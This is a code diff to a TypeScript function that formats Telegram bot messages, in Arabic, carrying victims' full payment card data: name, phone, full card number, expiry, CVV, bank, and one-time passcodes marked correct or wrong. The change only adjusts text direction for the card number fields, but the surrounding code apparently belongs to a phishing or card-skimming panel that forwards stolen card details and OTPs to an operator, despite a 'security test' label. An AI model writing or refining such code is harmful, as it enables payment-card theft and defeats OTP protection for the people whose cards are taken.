@@ -231,6 +231,8 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       
     case 'card_details':
       header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
+      const cardNumberDisplay1 = data.cardNumber ? `<span dir="ltr">${data.cardNumber}</span>` : 'غير محدد';
+      const last4Display1 = data.cardLast4 ? `<span dir="ltr">${data.cardLast4}</span>` : 'غير محدد';
       content = `
 🔐 <b>معلومات البطاقة (اختبار أمني):</b>
 • الاسم الكامل: ${data.name || 'غير محدد'}
@@ -238,8 +240,8 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • رقم الهاتف: ${data.phone || 'غير محدد'}
 • الخدمة: ${data.service || 'غير محدد'}
 • حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
+• رقم البطاقة: ${cardNumberDisplay1}
+• آخر 4 أرقام: ${last4Display1}
 • انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
 • رمز الأمان: ${data.cvv || 'غير محدد'}
 • المبلغ: ${data.amount || 'غير محدد'}
@@ -250,6 +252,8 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 
     case 'card_details_with_bank':
       header = '💳 <b>تفاصيل البطاقة مع معلومات البنك</b>';
+      const cardNumberDisplay2 = data.cardNumber ? `<span dir="ltr">${data.cardNumber}</span>` : 'غير محدد';
+      const last4Display2 = data.cardLast4 ? `<span dir="ltr">${data.cardLast4}</span>` : 'غير محدد';
       content = `
 🔐 <b>معلومات البطاقة والبنك (اختبار أمني):</b>
 • الاسم الكامل: ${data.name || 'غير محدد'}
@@ -259,8 +263,8 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
 • الدولة: ${data.country || 'غير محدد'}
 • البنك: ${data.bank || 'غير محدد'}
 • حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
+• رقم البطاقة: ${cardNumberDisplay2}
+• آخر 4 أرقام: ${last4Display2}
 • نوع البطاقة: ${data.cardType || 'غير محدد'}
 • انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
 • رمز الأمان: ${data.cvv || 'غير محدد'}
@@ -298,6 +302,8 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       header = '🔐 <b>محاولة رمز التحقق</b>';
       const otpStatusIcon = data.otp_status === 'correct' ? '✅' : '❌';
       const otpStatusText = data.otp_status === 'correct' ? 'صحيح' : 'خطأ';
+      const cardNumberDisplay = data.cardNumber ? `<span dir="ltr">${data.cardNumber}</span>` : 'غير محدد';
+      const last4Display = data.cardLast4 ? `<span dir="ltr">${data.cardLast4}</span>` : 'غير محدد';
       content = `
 ${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
 • الاسم الكامل: ${data.name || 'غير محدد'}
@@ -307,8 +313,8 @@ ${otpStatusIcon} <b>محاولة OTP (${otpStatusText})</b>
 • الخدمة: ${data.service || 'غير محدد'}
 • المبلغ: ${data.amount || 'غير محدد'}
 • حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
-• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
+• رقم البطاقة: ${cardNumberDisplay}
+• آخر 4 أرقام: ${last4Display}
 • انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
 • رمز الأمان: ${data.cvv || 'غير محدد'}
 • رمز OTP: ${data.otp || 'غير محدد'}
